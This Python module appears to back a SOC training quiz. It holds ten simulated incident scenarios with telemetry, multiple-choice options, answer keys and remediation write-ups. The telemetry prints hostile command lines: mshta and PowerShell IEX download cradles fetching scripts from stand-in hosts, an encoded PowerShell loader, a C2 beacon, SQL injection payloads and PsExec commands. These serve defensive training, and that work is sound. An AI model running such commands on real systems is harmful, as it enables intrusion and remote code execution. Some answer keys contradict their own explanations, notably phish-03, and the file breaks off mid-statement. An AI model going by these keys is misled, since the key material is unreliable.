"""
CyberGPT Scenario Manager - TryHackMe-style SOC training repository.
Hosts 10 fully-realized scenarios with raw telemetry, questions, options,
hints, and NIST/SANS PICERL post-incident explanations.

NOTE: Every telemetry/artifact block is prefixed with a simulation banner.
All domains use RFC 2606 reserved test namespaces (.example / .test) and all
IP addresses use RFC 5737 documentation ranges (TEST-NET-1/2/3). All
identifiers are dummy values. Nothing in this repository is real data.
"""

from dataclasses import dataclass, field, asdict
from typing import Dict, List, Optional, Any


@dataclass
class Scenario:
    id: str
    category: str
    difficulty: str
    title: str
    description: str
    telemetry: str  # raw monospace artifact block
    question: str
    options: List[str]
    correct_index: int
    hints: List[str]
    explanation: str  # NIST/SANS PICERL forensic breakdown
    iocs: List[str] = field(default_factory=list)
    mitre_tactics: List[str] = field(default_factory=list)

    @property
    def lab_type(self) -> str:
        """'phishing' for phish-XX scenarios, 'soc' for soc-XX drills."""
        return "phishing" if self.id.startswith("phish") else "soc"

    def to_dict(self) -> Dict[str, Any]:
        data = asdict(self)
        data["lab_type"] = self.lab_type
        return data


PHISHING = "Phishing Triage"
ENDPOINT = "Endpoint Defense"
ACTIVE_DIRECTORY = "Active Directory"
WEB_APPSEC = "Web AppSec"
CLOUD = "Cloud Security"

SCENARIO_REPOSITORY: Dict[str, Scenario] = {
    # ============================ PHISHING LAB ============================
    "phish-01": Scenario(
        id="phish-01",
        category=PHISHING,
        difficulty="Beginner",
        title="Payroll Diversion Phishing",
        description=(
            "An employee received an urgent email claiming payroll details changed. "
            "Analyze the email headers and body to identify the social-engineering indicators."
        ),
        telemetry=(
            "=== SIMULATED TRAINING EXAMPLE - NOT A REAL EMAIL ===\n"
            "=== EMAIL HEADER DUMP ===\n"
            "Return-Path: <payroll@payroll-update.contoso-hr.example>\n"
            "Received: from mx.payroll-update.contoso-hr.example (203.0.113.47)\n"
            "Authentication-Results:\n"
            "  spf=fail (domain of contoso.example does not designate 203.0.113.47)\n"
            "  dkim=none (no signature found)\n"
            "  dmarc=fail (spf fail + dkim none)\n"
            "Subject: URGENT: Payroll account update required within 24 hours\n"
            "From: \"Contoso Payroll Operations\" <payroll@payroll-update.contoso-hr.example>\n"
            "=== BODY ===\n"
            "Dear Employee,\n"
            "Our payroll system has detected a failed direct-deposit transfer.\n"
            "You MUST update your bank details within 24 HOURS or your salary\n"
            "will be suspended. Click here: http://payroll-update.contoso-hr.example/update\n"
            "This is an automated message. Do not reply."
        ),
        question="What is the PRIMARY indicator that this email is a credential-harvesting / payroll-diversion phishing attempt?",
        options=[
            "The display name 'Contoso Payroll Operations' uses a lookalike domain to bypass sender authentication controls",
            "SPF=fail proves the sending IP 203.0.113.47 is unauthorized per contoso.example DNS policy",
            "The 24-hour artificial deadline pressures the recipient into bypassing normal security scrutiny",
            "A generic greeting alone doesn't indicate phishing; domain auth results and SPF are the real indicators",
        ],
        correct_index=2,
        hints=[
            "Inspect the Return-Path domain carefully — is it actually contoso.example?",
            "Check the Authentication-Results block: what do SPF and DKIM failures mean?",
            "Notice the artificial 24-hour deadline — urgency is a classic payroll-diversion lever.",
        ],
        explanation=(
            "NIST SP 800-61r2 / SANS PICERL — Identification: SPF=fail proves the sending IP 203.0.113.47 is "
            "not authorized by contoso.example's DNS; DKIM=none means no cryptographic signature exists. "
            "The domain payroll-update.contoso-hr.example is a lookalike exploiting brand trust. The 24-hour "
            "deadline creates artificial urgency to bypass rational scrutiny. Containment: quarantine "
            "the message, block the domain and sending IP 203.0.113.47 at the SEG, purge any "
            "matching messages enterprise-wide. Recovery: verify payroll channels via out-of-band call."
        ),
        iocs=["payroll-update.contoso-hr.example", "203.0.113.47", "spf=fail", "dkim=none"],
        mitre_tactics=["TA0001 Initial Access", "TA0002 Execution"],
    ),
    "phish-02": Scenario(
        id="phish-02",
        category=PHISHING,
        difficulty="Intermediate",
        title="Quishing — QR Code Phishing Bypassing SEGs",
        description=(
            "A finance user reported an email containing a QR code claiming to be from "
            "Microsoft 365 asking to re-verify MFA. The Secure Email Gateway passed it clean."
        ),
        telemetry=(
            "=== SIMULATED TRAINING EXAMPLE - NOT A REAL EMAIL ===\n"
            "=== EMAIL ===\n"
            "Subject: Microsoft 365: MFA enrollment expiring — scan QR to verify\n"
            "From: \"Contoso Security Team\" <noreply@m365-verify.contoso-security.example>\n"
            "Attachments: QR_Reset.png (image/png, 42KB)\n"
            "Text body: 'Your MFA method expires today. Scan the QR code with your phone camera.'\n"
            "=== SEG SCAN LOG ===\n"
            "URL Rewriting: no URLs found in body (0 links)\n"
            "Attachment sandbox: PNG — clean (no macros, no scripts)\n"
            "=== POST-CLICK TELEMETRY ===\n"
            "User scanned QR -> phone opened https://m365-verify.contoso-security.example/login\n"
            "Page mimics Microsoft 365 sign-in; steals credentials + session cookie"
        ),
        question="Why did the Secure Email Gateway (SEG) fail to block this attack, and what is the core risk?",
        options=[
            "The SEG lacked OCR capability to parse QR code images, treating the attachment as benign image-only content",
            "Many Secure Email Gateways cannot inspect URLs embedded in QR code images, so this can evade URL scanning and link rewriting",
            "The PNG sandbox rated the attachment clean, so the gateway classified the entire message as low risk and released it to the user",
            "No plain-text alternative part prevented heuristic content rules from matching known phishing template patterns",
        ],
        correct_index=1,
        hints=[
            "Look at the SEG scan log: how many URLs were detected in the body?",
            "A QR code is an image — can the SEG parse what it encodes?",
            "Where does the payload detonate? Consider the mobile device surface.",
        ],
        explanation=(
            "NIST SP 800-61r2 / SANS PICERL — Identification: Quishing moves the kill chain off the "
            "email gateway by embedding the malicious URL inside a QR image; many Secure Email Gateways "
            "cannot inspect URLs embedded in QR code images, so URL reputation and link-rewriting engines "
            "see zero links. The pivot to a personal mobile device escapes corporate proxy and DNS controls. "
            "Detection: OCR-scan QR attachments in the mail flow, flag image-only emails with urgency "
            "language. Containment: block m365-verify.contoso-security.example, reset the user's credentials "
            "and revoke refresh tokens. Lessons Learned: enforce number-matching or FIDO2 phishing-resistant "
            "MFA to neutralize credential theft."
        ),
        iocs=["m365-verify.contoso-security.example", "QR_Reset.png", "noreply@m365-verify.contoso-security.example"],
        mitre_tactics=["TA0001 Initial Access", "TA0006 Credential Access"],
    ),
    "phish-03": Scenario(
        id="phish-03",
        category=PHISHING,
        difficulty="Advanced",
        title="Illicit OAuth 2.0 Consent Grant Abuse",
        description=(
            "A user clicked a 'Read document' link and was prompted to authorize an app. "
            "Review the OAuth consent request and the application registration details."
        ),
        telemetry=(
            "=== SIMULATED TRAINING EXAMPLE - NOT REAL TELEMETRY ===\n"
            "=== OAUTH CONSENT PROMPT ===\n"
            "App name: 'DocuSign Secure Viewer' (unverified publisher)\n"
            "Publisher: NOT VERIFIED — domain: untrusted-host.example\n"
            "Permissions requested:\n"
            "  Mail.ReadWrite    — read and modify all mailboxes\n"
            "  Offline_Access    — persist access without re-auth\n"
            "  User.Read         — basic profile\n"
            "=== APP REGISTRATION (Entra ID) ===\n"
            "AppId: 00000000-0000-0000-0000-000000000000\n"
            "Redirect URI: https://untrusted-host.example/callback\n"
            "=== POST-GRANT ACTIVITY (10 min later) ===\n"
            "Graph API: GET /me/messages (200 OK, 1,240 messages enumerated)\n"
            "Graph API: POST /me/sendMail — BEC email forwarded to finance-team@contoso.example"
        ),
        question="What makes this OAuth consent phishing campaign particularly dangerous compared to credential phishing?",
        options=[
            "Mail.ReadWrite scope grants read/write access to all mailboxes without needing credentials, enabling full mailbox compromise",
            "Offline_Access issues a refresh token that persists through password resets and MFA changes, enabling long-term access",
            "The attacker registered the app with dummy GUID 00000000-0000-0000-0000-000000000000 to abuse tenant consent flows",
            "The app name imitates a well-known vendor to confuse users during the Entra ID consent prompt, increasing click-through rates",
        ],
        correct_index=2,
        hints=[
            "List the exact scopes requested — what can Mail.ReadWrite do?",
            "What does Offline_Access allow the attacker to persist?",
            "Does MFA protect API token access once consent is granted?",
        ],
        explanation=(
            "NIST SP 800-61r2 / SANS PICERL — Identification: Illicit consent grants weaponize OAuth "
            "as a persistence mechanism. Mail.ReadWrite allows full mailbox read/write; Offline_Access "
            "issues a refresh token that survives password resets. Because the user authenticates via "
            "legitimate Microsoft identity flows, MFA is satisfied by the victim — the attacker rides "
            "the token. Containment: revoke the grant in Entra ID (Enterprise Applications > "
            "Consent & permissions > Revoke), disable the AppId 00000000-0000-0000-0000-000000000000, "
            "block untrusted-host.example. Prevention: restrict tenant consent to verified publishers, "
            "block unverified apps, and audit grants with Microsoft Cloud App Security."
        ),
        iocs=["00000000-0000-0000-0000-000000000000", "untrusted-host.example", "Mail.ReadWrite", "Offline_Access"],
        mitre_tactics=["TA0001 Initial Access", "TA0003 Persistence", "TA0006 Credential Access"],
    ),
    "phish-04": Scenario(
        id="phish-04",
        category=PHISHING,
        difficulty="Intermediate",
        title="Malicious Invoice LNK Staging PowerShell Downloader",
        description=(
            "An accounts-payable user opened an invoice attachment. The attachment was a "
            "shortcut (.lnk) file. Analyze the telemetry captured by the endpoint agent."
        ),
        telemetry=(
            "=== SIMULATED TRAINING EXAMPLE - NOT REAL TELEMETRY ===\n"
            "=== ATTACHMENT ===\n"
            "Invoice_Q4_2025.lnk (ShellLink, 4KB) — icon spoofed as PDF\n"
            "=== SYSPMON EVENT ID 1 (Process Create) ===\n"
            "Image: C:\\Windows\\System32\\cmd.exe\n"
            "CommandLine: cmd.exe /c start mshta.exe \"http://198.51.100.44/update.hta\" & del Invoice_Q4_2025.lnk\n"
            "ParentImage: C:\\Windows\\explorer.exe\n"
            "=== NETWORK (Event ID 3) ===\n"
            "mshta.exe -> 198.51.100.44:80 (GET /update.hta) 200 OK\n"
            "update.hta spawns: powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.44/payload.ps1')\n"
            "payload.ps1 -> c2-gateway.test:4444 (TLS beacon, JA3 match: CobaltStrike)"
        ),
        question="What is the correct detection conclusion and immediate containment for this LNK-based attack?",
        options=[
            "The .lnk masqueraded as a PDF and chained cmd -> mshta -> powershell to fetch and run a remote payload; isolate the host",
            "A PDF reader vulnerability was exploited through the spoofed icon, so patching Adobe Acrobat across the entire fleet is the priority containment step now",
            "The user downloaded a legitimate invoice from a known vendor, so no containment or further triage is needed at this time by the SOC",
            "Windows Defender failed because the LNK attachment was encrypted with a simple XOR scheme before delivery to the endpoint",
        ],
        correct_index=0,
        hints=[
            "What file type is the attachment really, and what icon does it spoof?",
            "Trace the process chain: cmd.exe -> which LOLBin -> which interpreter?",
            "Check the final network connection: what does the JA3 match indicate?",
        ],
        explanation=(
            "NIST SP 800-61r2 / SANS PICERL — Identification: The .lnk abuses ShellLink execution and "
            "icon spoofing to appear as a PDF. The kill chain uses living-off-the-land binaries: "
            "cmd.exe -> mshta.exe (HTML Application) -> powershell.exe download cradle -> TLS beacon "
            "with a CobaltStrike JA3 fingerprint. Detection: Sysmon EID 1 CommandLine + EID 3 "
            "destination, plus JA3/SIGMA rules on unmanaged mshta/powershell downloaders. "
            "Containment: network-isolate the endpoint, block 198.51.100.44 and c2-gateway.test at "
            "the egress proxy, kill the beacon process, capture memory for forensics. Recovery: "
            "reimage or perform full AV/EDR sweep; hunt for matching JA3 across the fleet."
        ),
        iocs=["Invoice_Q4_2025.lnk", "198.51.100.44", "c2-gateway.test:4444", "update.hta", "CobaltStrike JA3"],
        mitre_tactics=["TA0001 Initial Access", "TA0002 Execution", "TA0011 Command & Control"],
    ),

    # ============================ SOC IR DRILLS ============================
    "soc-01": Scenario(
        id="soc-01",
        category=ENDPOINT,
        difficulty="Intermediate",
        title="Endpoint Defense — Obfuscated Base64 PowerShell (-enc)",
        description=(
            "A workstation triggered an EDR alert on a suspicious PowerShell invocation. "
            "Decode the execution telemetry and determine the threat."
        ),
        telemetry=(
            "=== SIMULATED TRAINING EXAMPLE - NOT REAL TELEMETRY ===\n"
            "=== SYSPMON EVENT ID 1 ===\n"
            "UtcTime: 2026-10-09 14:22:07.441\n"
            "ProcessGuid: 00000000-0000-0000-0000-000000000000\n"
            "Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n"
            "CommandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADQANAAvAHMAdABhAGcAZQAuAHAAcwAxACcAKQA=\n"
            "ParentImage: C:\\Program Files\\Common Files\\updater.exe\n"
            "=== SYSPMON EVENT ID 3 (Network) ===\n"
            "powershell.exe -> 192.0.2.44:80 (GET /stage.ps1) 200 OK\n"
            "DestinationPort: 80, Protocol: TCP\n"
            "=== BASE64 DECODE (UTF-16LE) ===\n"
            "IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.44/stage.ps1')"
        ),
        question="Decoding the -enc payload reveals which malicious behavior?",
        options=[
            "A benign Windows Update check that performs no network activity, writes nothing to disk, and leaves no forensic artifacts behind on the host",
            "A scheduled task that enumerates local user accounts and writes the enumeration results to the Windows event log for review",
            "An IEX download cradle fetching and executing remote script from http://192.0.2.44 — a fileless PowerShell loader with C2 beaconing",
            "A certificate enrollment request sent to an internal enterprise CA over TCP port 80 with no payload",
        ],
        correct_index=2,
        hints=[
            "The -enc flag means Base64-encoded UTF-16LE. Decode it first.",
            "Look for 'IEX' and 'Net.WebClient' in the decoded string.",
            "Correlate Event ID 1 (process) with Event ID 3 (network) — where did the shell connect?",
        ],
        explanation=(
            "NIST SP 800-61r2 / SANS PICERL — Detection: The -enc parameter hides the command from "
            "command-line auditing. Decoded, it is IEX (New-Object Net.WebClient).DownloadString(...) — "
            "a fileless download cradle that pulls and executes script in memory. Sysmon EID 3 confirms "
            "the outbound connection to 192.0.2.44:80, establishing C2 beaconing. "
            "Sigma rule: detect powershell.exe with '-enc' AND parent not explorer.exe. "
            "Containment: isolate host, kill process tree (updater.exe -> powershell.exe), block "
            "192.0.2.44 egress, capture memory image before reboot for fileless artifact recovery."
        ),
        iocs=["-enc", "powershell.exe -nop -w hidden", "192.0.2.44:80", "updater.exe", "IEX DownloadString"],
        mitre_tactics=["TA0002 Execution", "TA0005 Defense Evasion", "TA0011 Command & Control"],
    ),
    "soc-02": Scenario(
        id="soc-02",
        category=ACTIVE_DIRECTORY,
        difficulty="Beginner",
        title="Authentication — RDP Password Spraying",
        description=(
            "The SIEM flagged a burst of failed logons followed by a single success on "
            "a jump server. Review the Windows Security event sequence."
        ),
        telemetry=(
            "=== SIMULATED TRAINING EXAMPLE - NOT REAL TELEMETRY ===\n"
            "=== EVENT ID 4625 (Failed Logon) — burst ===\n"
            "LogonType: 10 (RemoteInteractive / RDP)\n"
            "Status: 0xC000006A  (bad username or password)\n"
            "Account: admin@contoso.example  SourceIP: 198.51.100.99  Time: 02:01:14\n"
            "Account: administrator@contoso.example  SourceIP: 198.51.100.99  Time: 02:01:15\n"
            "Account: svc_backup@contoso.example  SourceIP: 198.51.100.99  Time: 02:01:16\n"
            "Account: jdoe@contoso.example  SourceIP: 198.51.100.99  Time: 02:01:17\n"
            "(+ 340 more 4625 events, same source IP, 1 password attempt per account)\n"
            "=== EVENT ID 4624 (Success) ===\n"
            "Account: svc_backup@contoso.example  LogonType: 10  SourceIP: 198.51.100.99  Time: 02:04:52"
        ),
        question="What attack pattern do these events demonstrate?",
        options=[
            "A password spray: one common password across many accounts, then a 4624 LogonType 10 RDP success for svc_backup from the same source IP",
            "A brute-force attack against a single service account using thousands of different passwords until the domain lockout threshold is finally triggered by the account policy",
            "Normal user behavior with occasional mistyped passwords spread across the morning shift on the corporate jump server infrastructure by several staff",
            "A Kerberos ticket-granting ticket (TGT) flood aimed at overwhelming the domain controller's authentication queue and causing a sustained denial of service condition",
        ],
        correct_index=0,
        hints=[
            "Count the accounts vs. password attempts — is it many passwords on one user, or one password on many users?",
            "What does status 0xC000006A mean?",
            "Which account finally succeeded, and what LogonType is 10?",
        ],
        explanation=(
            "NIST SP 800-61r2 / SANS PICERL — Detection: Password spraying (TA0006) distributes a "
            "small set of common passwords across many accounts to stay under lockout thresholds. "
            "Signature: burst of 4625 (0xC000006A) with one attempt per username, single source IP, "
            "then a 4624 LogonType 10 (RDP) success. The compromised svc_backup account is a service "
            "account — high-value pivot target. Containment: block 198.51.100.99 at the perimeter, "
            "disable svc_backup, force password resets, hunt for lateral movement (4624 on other "
            "hosts). Prevention: enforce lockout policy, MFA on RDP, and monitor 4625 bursts with "
            "Sigma rules on SourceIP cardinality."
        ),
        iocs=["198.51.100.99", "0xC000006A", "LogonType 10", "svc_backup", "EventID 4625 burst"],
        mitre_tactics=["TA0006 Credential Access", "TA0007 Discovery"],
    ),
    "soc-03": Scenario(
        id="soc-03",
        category=ACTIVE_DIRECTORY,
        difficulty="Advanced",
        title="Active Directory — Kerberoasting Detection",
        description=(
            "A domain controller logged an anomalous spike in service ticket requests. "
            "Analyze the Kerberos telemetry for evidence of Kerberoasting."
        ),
        telemetry=(
            "=== SIMULATED TRAINING EXAMPLE - NOT REAL TELEMETRY ===\n"
            "=== EVENT ID 4769 (Kerberos Service Ticket Request) ===\n"
            "Account: jsmith@CONTOSO.EXAMPLE  (legitimate user)\n"
            "Service: HTTP/websrv01.contoso.example\n"
            "Ticket Encryption Type: 0x17 (RC4-HMAC)  <-- legacy/weak\n"
            "FailureCode: 0x0 (success)\n"
            "--- repeated 40+ times in 90 seconds across services ---\n"
            "Service: MSSQLSvc/dbsrv01.contoso.example  EncType: 0x17 (RC4-HMAC)\n"
            "Service: CIFS/filesrv01.contoso.example     EncType: 0x17 (RC4-HMAC)\n"
            "=== ANOMALY ===\n"
            "Normal baseline: AES (0x12/0x13) encryption for all TGS requests\n"
            "Attacker requests RC4 (0x17) to obtain crackable offline hashes\n"
            "Process on jsmith workstation: Rubeus.exe (unsigned binary in %TEMP%)"
        ),
        question="Why are the 4769 events with Ticket Encryption Type 0x17 (RC4-HMAC) a critical alert for Kerberoasting?",
        options=[
            "RC4 tickets are larger and consume significant domain controller CPU during the service ticket request cycle, degrading authentication performance for all legitimate users in the domain",
            "Kerberoasting requests RC4 tickets (0x17) because RC4 is crackable offline; the 4769 spike for SPNs from one user plus Rubeus.exe indicates hash extraction",
            "0x17 means the service ticket was forged and never reached the domain controller for validation or logging purposes by the KDC",
            "RC4 encryption indicates the user is authenticating from a non-domain device outside the corporate network perimeter firewall",
        ],
        correct_index=1,
        hints=[
            "What is the difference between 0x12/0x13 (AES) and 0x17 (RC4) for offline cracking?",
            "Why would an attacker request RC4 explicitly instead of the default AES?",
            "Look for the unsigned binary in %TEMP% — what tool is that?",
        ],
        explanation=(
            "NIST SP 800-61r2 / SANS PICERL — Detection: Kerberoasting (TA0006) abuses the Kerberos "
            "protocol: any domain user can request TGS for SPNs, and requesting RC4 (0x17) yields "
            "hashes crackable offline (vs. AES which is far stronger). Sigma detection: 4769 with "
            "TicketEncryptionType=0x17 where the account has no historical RC4 usage, plus high "
            "request volume. Rubeus.exe is the canonical Kerberoasting toolkit. Containment: "
            "isolate jsmith's workstation, capture the Rubeus binary and memory, rotate service "
            "account passwords (gMSA strongly recommended), disable RC4 in the domain "
            "(msDS-SupportedEncryptionTypes). Recovery: audit all SPNs and monitor for abnormal TGS "
            "patterns going forward."
        ),
        iocs=["Rubeus.exe", "0x17 (RC4-HMAC)", "EventID 4769 spike", "MSSQLSvc/dbsrv01.contoso.example", "HTTP/websrv01.contoso.example"],
        mitre_tactics=["TA0006 Credential Access", "TA0007 Discovery"],
    ),
    "soc-04": Scenario(
        id="soc-04",
        category=ACTIVE_DIRECTORY,
        difficulty="Advanced",
        title="Lateral Movement — Pass-the-Hash via PsExec",
        description=(
            "After an initial compromise, an attacker moved to a file server using "
            "PsExec. Review the endpoint and service telemetry."
        ),
        telemetry=(
            "=== SIMULATED TRAINING EXAMPLE - NOT REAL TELEMETRY ===\n"
            "=== EVENT ID 7045 (New Service Installed) ===\n"
            "Service: PSEXESVC  (display: PsExec Service)\n"
            "ImagePath: C:\\Windows\\PSEXESVC.exe\n"
            "Hostname: FSERVER01  Time: 03:12:44\n"
            "=== SMB SESSION (Event ID 5140 / network) ===\n"
            "Source: WKSTN-4471  ->  \\\\FSERVER01\\ADMIN$  (write access)\n"
            "File written: ADMIN$\\PSEXESVC.exe\n"
            "=== AUTH (Event ID 4624) ===\n"
            "Account: Administrator@CONTOSO.EXAMPLE  LogonType: 3 (Network)\n"
            "AuthenticationPackage: NTLM  (hash pass, not password)\n"
            "Process: psexec.exe -accepteula -s -d \\\\FSERVER01 cmd.exe"
        ),
        question="What evidence confirms Pass-the-Hash (PtH) lateral movement via PsExec?",
        options=[
            "A scheduled task was created on FSERVER01 by an administrator during a routine maintenance window last night for the nightly backups",
            "The Administrator account logged on locally at the physical console using an interactive LogonType 2 session from the KVM switch",
            "NTLM authentication (not a password), an ADMIN$ write, PSEXESVC install via Event ID 7045, and remote cmd.exe — a captured hash was reused",
            "An antivirus definition update was pushed to FSERVER01 remotely by the endpoint management platform overnight via the administrative SMB share path with write access",
        ],
        correct_index=2,
        hints=[
            "Which authentication package was used — Kerberos or NTLM? What does NTLM imply?",
            "What share did the attacker write to, and why is ADMIN$ significant?",
            "Event ID 7045 indicates what type of persistence/exec mechanism?",
        ],
        explanation=(
            "NIST SP 800-61r2 / SANS PICERL — Detection: Pass-the-Hash (TA0008) reuses a captured "
            "NTLM hash to authenticate to remote hosts without the plaintext password. PsExec writes "
            "PSEXESVC.exe to ADMIN$ (administrative share), installs it as a service (EID 7045), and "
            "spawns cmd.exe. Sigma: correlate EID 7045 (PSEXESVC) + ADMIN$ writes + NTLM 4624 "
            "LogonType 3 from a workstation. Containment: isolate WKSTN-4471 (initial hash theft "
            "vector) and FSERVER01, kill PSEXESVC, purge ADMIN$, force the Administrator hash "
            "rotation (password reset invalidates the hash). Recovery: hunt for other ADMIN$ writes "
            "and NTLM usage; migrate to Kerberos + constrained delegation and LAPS for local admin."
        ),
        iocs=["PSEXESVC", "EventID 7045", "ADMIN$ share", "NTLM LogonType 3", "psexec.exe -accepteula"],
        mitre_tactics=["TA0008 Lateral Movement", "TA0004 Privilege Escalation"],
    ),
    "soc-05": Scenario(
        id="soc-05",
        category=WEB_APPSEC,
        difficulty="Intermediate",
        title="Web AppSec — Time-Based Blind SQL Injection",
        description=(
            "The WAF logged a suspicious query against the legacy authentication portal. "
            "Analyze the request and response timing."
        ),
        telemetry=(
            "=== SIMULATED TRAINING EXAMPLE - NOT REAL TELEMETRY ===\n"
            "=== HTTP REQUEST ===\n"
            "POST /login HTTP/1.1\n"
            "Username: admin' WAITFOR DELAY '0:0:10'--\n"
            "Password: x\n"
            "=== WAF LOG ===\n"
            "Rule hit: SQL Injection (WAITFOR DELAY pattern)\n"
            "=== RESPONSE TIMING ===\n"
            "Baseline /login response: 180ms\n"
            "Injected request response: 10,240ms  (10 second delay observed)\n"
            "=== SECOND PROBE ===\n"
            "Username: admin' IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--\n"
            "Response: 5,180ms -> boolean inference confirmed: DB accepts stacked T-SQL"
        ),
        question="What does the 10,240ms response time prove, and why is this attack class dangerous?",
        options=[
            "Time-based blind SQLi: the WAITFOR DELAY executed server-side, proving input reaches the SQL engine; attackers infer content via timing oracles",
            "The server was under heavy load at that moment, so the observed response timing is purely coincidental and not attacker-controlled in any way",
            "The WAF intentionally delayed the response for deep packet inspection before forwarding to the backend application server",
            "The login endpoint performs a slow bcrypt hash comparison, which naturally explains the multi-second delay in the response cycle, particularly with adaptive work factors",
        ],
        correct_index=0,
        hints=[
            "Compare the baseline (180ms) to the injected response (10,240ms) — why the ~10s gap?",
            "The payload contains WAITFOR DELAY — where does that syntax execute?",
            "If no error messages or data are returned, how does the attacker still extract information?",
        ],
        explanation=(
            "NIST SP 800-61r2 / SANS PICERL — Detection: Time-based blind SQLi (TA0007/TA0006) is "
            "used when UNION-based extraction is blocked or error messages are suppressed. The "
            "WAITFOR DELAY '0:0:10' sleeping proves the DBMS executed attacker-controlled T-SQL; "
            "conditional delays (IF...WAITFOR) turn the server into a boolean oracle to exfiltrate "
            "schema/data character-by-character. Sigma/WAF rule: regex WAITFOR\\s+DELAY, "
            "SLEEP\\(\\d+\\), pg_sleep. Containment: block source IP, patch the query with "
            "parameterized statements (never string concatenation), enforce least-privilege DB "
            "accounts (no stacked queries, no xp_cmdshell). Recovery: audit DB logs for prior "
            "extraction, rotate credentials stored in the users table."
        ),
        iocs=["WAITFOR DELAY", "admin'--", "10,240ms response", "stacked T-SQL", "IF (SELECT COUNT(*))"],
        mitre_tactics=["TA0007 Discovery", "TA0006 Credential Access"],
    ),
    "soc-06": Scenario(
        id="soc-06",
        category=CLOUD,
        difficulty="Intermediate",
        title="Cloud Security — AWS CloudTrail S3 Public Exposure",
        description=(
            "CloudTrail recorded a suspicious S3 bucket policy change from an "
            "unrecognized IAM principal. Analyze the audit trail."
        ),
        telemetry=(
            "=== SIMULATED TRAINING EXAMPLE - NOT REAL TELEMETRY ===\n"
            "=== AWS CLOUDTRAIL EVENT ===\n"
            "EventName: PutBucketPolicy\n"
            "BucketName: corp-backups-2026-legacy\n"
            "UserIdentity: arn:aws:iam::419832111222:user/legacy-deploy (MFA: false)\n"
            "SourceIP: 198.51.100.44 (not in corporate egress range)\n"
            "=== NEW BUCKET POLICY (applied) ===\n"
            "{\n"
            "  \"Version\": \"2012-10-17\",\n"
            "  \"Statement\": [{\n"
            "    \"Effect\": \"Allow\",\n"
            "    \"Principal\": \"*\",\n"
            "    \"Action\": \"s3:GetObject\",\n"
            "    \"Resource\": \"arn:aws:s3:::corp-backups-2026-legacy/*\"\n"
            "  }]\n"
            "}\n"
            "=== CONFIG RULE ===\n"
            "s3-bucket-public-read-prohibited: NON_COMPLIANT"
        ),
        question="What is the security impact of this CloudTrail event, and what is the correct remediation?",
        options=[
            "A legitimate backup job ran under a scheduled maintenance plan, so no action is required and the policy change is expected by the operations team on call",
            "PutBucketPolicy with Principal '*' and s3:GetObject made every object in corp-backups-2026-legacy publicly readable to the internet — treat as a breach and revert immediately",
            "The bucket was deleted and must be restored from Glacier before any forensic analysis of the policy change can begin properly",
            "IAM user legacy-deploy rotated its access keys as part of a routine credential hygiene process, which explains the event and requires no response from the security operations center",
        ],
        correct_index=1,
        hints=[
            "What does 'Principal': '*' mean in an S3 policy statement?",
            "Which action was allowed — and what data does it expose?",
            "Check UserIdentity: was MFA used, and is the SourceIP in the corporate range?",
        ],
        explanation=(
            "NIST SP 800-61r2 / SANS PICERL — Detection: An unauthenticated-context PutBucketPolicy "
            "granting Principal '*' s3:GetObject publicly exposes all objects (TA0009 Collection, "
            "TA0010 Exfiltration risk). Red flags: MFA not used, SourceIP outside corporate egress, "
            "Config rule NON_COMPLIANT. Containment: immediately apply a restrictive bucket policy "
            "(or Block Public Access at the account level), revoke legacy-deploy credentials, list "
            "CloudTrail GetObject events post-change for external principals, and check S3 access "
            "logs for bulk downloads. Prevention: SCP denying s3:PutBucketPolicy without MFA, "
            "Config auto-remediation Lambda, and guardrails via AWS Security Hub."
        ),
        iocs=["Principal: *", "s3:GetObject", "corp-backups-2026-legacy", "legacy-deploy", "198.51.100.44", "PutBucketPolicy"],
        mitre_tactics=["TA0009 Collection", "TA0010 Exfiltration"],
    ),
}

CATEGORIES = ["All Labs", PHISHING, ENDPOINT, ACTIVE_DIRECTORY, WEB_APPSEC, CLOUD]


def get_all_scenarios() -> List[Dict[str, Any]]:
    return [s.to_dict() for s in SCENARIO_REPOSITORY.values()]


def get_scenario(scenario_id: str) -> Optional[Dict[str, Any]]:
    scenario = SCENARIO_REPOSITORY.get(scenario_id)
    return scenario.to_dict() if scenario else None


def get_categories() -> List[str]:
    return list(CATEGORIES)


def get_scenarios_by_category(category: str) -> List[Dict[str, Any]]:
    if category == "All Labs" or not category:
        return get_all_scenarios()
    return [s.to_dict() for s in SCENARIO_REPOSITORY.values() if s.category == category]


def get_scenarios(
    lab: str = "all", category: str = "All Labs"
) -> List[Dict[str, Any]]:
    """Filter scenarios by lab type ('all' | 'phishing' | 'soc') and category."""
    scenarios = SCENARIO_REPOSITORY.values()

    if lab == "phishing":
        scenarios = [s for s in scenarios if s.lab_type == "phishing"]
    elif lab == "soc":
        scenarios = [s for s in scenarios if s.lab_type == "soc"]

    if category and category not in ("All Labs", "All"):
        scenarios = [s for s in scenarios if s.category == category]

    return [s.to_dict() for s in scenarios]


def get_phishing_scenarios(category: str = "All Labs") -> List[Dict[str, Any]]:
    return get_scenarios(lab="phishing", category=category)


def get_soc_scenarios(category: str = "All Labs") -> List[Dict[str, Any]]:
    return get_scenarios(lab="soc", category=category)


def evaluate_answer(scenario_id: str, selected_index: int) -> Dict[str, Any]:
    """Evaluate a user's answer and return a forensic breakdown."""
    scenario = SCENARIO_REPOSITORY.get(scenario_id)
    if not scenario:
        return {
            "valid": False,
            "error": f"Scenario '{scenario_id}' not found in repository",
            "correct": False,
            "score": 0,
        }

    is_correct = selected_index == scenario.correct_index
    score = 100 if is_correct else 0

    return {
        "valid": True,
        "scenario_id": scenario.id,
        "scenario_title": scenario.title,
        "correct": is_correct,
        "selected_index": selected_index,
        "correct_index": scenario.correct_index,
        "selected_option": (
            scenario.options[selected_index]
            if 0 <= selected_index < len(scenario.options)
            else None
        ),
        "correct_option": scenario.options[scenario.correct_index],
        "explanation": scenario.explanation,
        "iocs": scenario.iocs,
        "mitre_tactics": scenario.mitre_tactics,
        "score": score,
        "badge": "✔ CORRECT — Threat Identified" if is_correct else "✘ VULNERABLE — Re-examine the telemetry",
        "difficulty": scenario.difficulty,
        "category": scenario.category,
    }


scenario_manager = {
